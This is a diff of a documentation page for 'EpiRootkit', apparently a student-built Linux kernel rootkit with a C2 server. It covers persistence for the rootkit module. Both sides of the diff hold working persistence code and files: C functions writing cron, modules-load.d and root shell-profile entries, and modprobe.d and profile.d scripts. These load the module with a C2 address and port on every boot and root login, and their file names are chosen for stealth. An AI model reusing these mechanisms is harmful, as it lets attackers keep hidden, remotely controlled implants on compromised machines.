@@ -1,134 +1,93 @@
 ---
 title: "Persistence"
-description: "Multiple boot persistence mechanisms for rootkit survival"
-icon: "refresh"
-date: "2025-05-25T00:00:00+01:00"
-lastmod: "2025-05-25T00:00:00+01:00"
+description: "Automatic rootkit loading across reboots"
+icon: "autorenew"
+date: "2025-05-30T00:00:00+01:00"
+lastmod: "2025-05-30T00:00:00+01:00"
 draft: false
 toc: true
-weight: 513
+weight: 515
 ---
 
 # Persistence
 
-Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.
+Two mechanisms for automatic module loading: **modules-load.d** (boot) and **shell profile** (login).
 
-## Three Mechanisms
+## modules-load.d Method
 
-### 1. modules-load.d
-**File**: `/etc/modules-load.d/jules_est_bo_system.conf`  
-**Content**: `epirootkit address=X.X.X.X port=YYYY`  
-**Trigger**: systemd reads config and loads module automatically on boot
+Creates two files:
 
-### 2. Cron Jobs  
-**File**: `/etc/cron.d/jules_est_bo_update`  
-**Schedule**: Every 5 minutes check and load if not present  
-**Stealth**: Disguised as system update task with stealth naming
-
-### 3. Shell Profiles
-**File**: `/etc/profile.d/jules_est_bo_env.sh`  
-**Trigger**: Executes when root user logs in  
-**Check**: Loads module if not already present
-
-## Implementation
-
-### Automatic Installation
-```c
-int persistence_init(void)
-{
-    return persistence_install(); // Install all mechanisms
-}
-```
-
-### Individual Mechanisms
-```c
-// modules-load.d persistence
-int persistence_install_modules_load(void)
-{
-    return write_file("/etc/modules-load.d/jules_est_bo_system.conf", "epirootkit address=X.X.X.X port=YYYY\n");
-}
-
-// Cron persistence (every 5 minutes)
-int persistence_install_cron(void) 
-{
-    const char *cron_content = 
-        "*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then "
-        "modprobe epirootkit 2>/dev/null || "
-        "insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'\n";
-    
-    return write_file("/etc/cron.d/jules_est_bo_update", cron_content, 0644);
-}
-
-// Shell profile persistence
-int persistence_install_shell_profile(void)
-{
-    const char *profile_content = 
-        "#!/bin/bash\n"
-        "if [ \"$(id -u)\" -eq 0 ]; then\n"
-        "    if ! lsmod | grep -q epirootkit 2>/dev/null; then\n"
-        "        modprobe epirootkit 2>/dev/null\n"
-        "    fi\n"
-        "fi\n";
-    
-    return write_file("/etc/profile.d/jules_est_bo_env.sh", profile_content, 0755);
-}
-```
-
-## Usage
-
-### WebUI Control
-**[Persistence Panel](../../04-web-ui/features/panels/persistence-panel.md)** provides:
-- **Install All**: Enable all three persistence mechanisms
-- **Remove All**: Disable all persistence mechanisms  
-- **Individual Control**: Toggle each mechanism separately (modules-load.d, cron, shell profile)
-- **Real-time Status**: View current state of each persistence method
-- **Visual Indicators**: Color-coded status for active/inactive mechanisms
-
-### C2 Commands
+**`/etc/modules-load.d/jules_est_bo_system.conf`**:
 ```bash
-# Install all persistence mechanisms
-persist_install Client-1
-
-# Remove all mechanisms
-persist_remove Client-1
-
-# Individual control
-persist_modules Client-1    # modules-load.d only
-persist_cron Client-1       # cron only
-persist_profile Client-1    # shell profile only
+# EpiRootkit module
+epirootkit
 ```
 
-## Verification
-
-### Check Installation
+**`/etc/modprobe.d/jules_est_bo_modprobe.conf`**:
 ```bash
-# modules-load.d
-cat /etc/modules-load.d/jules_est_bo_system.conf
-# epirootkit address=X.X.X.X port=YYYY
-
-# Cron job
-cat /etc/cron.d/jules_est_bo_update
-# */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'
-
-# Shell profile
-cat /etc/profile.d/jules_est_bo_env.sh
-# #!/bin/bash
-# if [ "$(id -u)" -eq 0 ]; then
-#     if ! lsmod | grep -q epirootkit 2>/dev/null; then
-#         modprobe epirootkit 2>/dev/null
-#     fi
-# fi
+# EpiRootkit module parameters
+options epirootkit address=192.168.200.11 port=4444
 ```
 
-### Test Persistence
-```bash
-# Remove module and reboot
-rmmod epirootkit
-reboot
+## Shell Profile Method
 
-# Check if module reloaded
+Creates `/etc/profile.d/jules_est_bo_env.sh`:
+
+```bash
+#!/bin/bash
+# System environment initialization
+if [ "$(id -u)" -eq 0 ]; then
+    # Check if module is already loaded via proc filesystem
+    if [ ! -f /proc/epirootkit_status ] && ! grep -q "^epirootkit " /proc/modules 2>/dev/null; then
+        modprobe epirootkit address=192.168.200.11 port=4444 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2>/dev/null
+    fi
+fi
+```
+
+## Commands
+
+```bash
+persist                      # Install both methods
+persist_remove               # Remove all
+status                       # Check status
+```
+
+## Testing
+
+```bash
+sudo insmod epirootkit.ko address=192.168.200.11 port=4444
+# Install persistence via C2/WebUI command: persist
+sudo reboot
 lsmod | grep epirootkit
-# epirootkit               20480  0
 ```
 
-All mechanisms are **enabled by default** and can be managed via WebUI or C2 commands.
+## Status Response
+
+```json
+{
+  "persistence": {
+    "enabled": true,
+    "methods": {
+      "modules_load": {
+        "active": true, 
+        "files": {
+          "modules_load": "/etc/modules-load.d/jules_est_bo_system.conf",
+          "modprobe": "/etc/modprobe.d/jules_est_bo_modprobe.conf"
+        }
+      },
+      "shell_profile": {
+        "active": true, 
+        "path": "/etc/profile.d/jules_est_bo_env.sh"
+      }
+    }
+  }
+}
+```
+
+## File Naming
+
+- **modules-load.d**: Uses `jules_est_bo_` prefix for stealth (matches file hiding pattern)
+- **modprobe.d**: Uses `jules_est_bo_` prefix for stealth consistency  
+- **profile.d**: Uses `jules_est_bo_` prefix for stealth
+
+**Reliable, standards-compliant persistence with consistent stealth naming.**
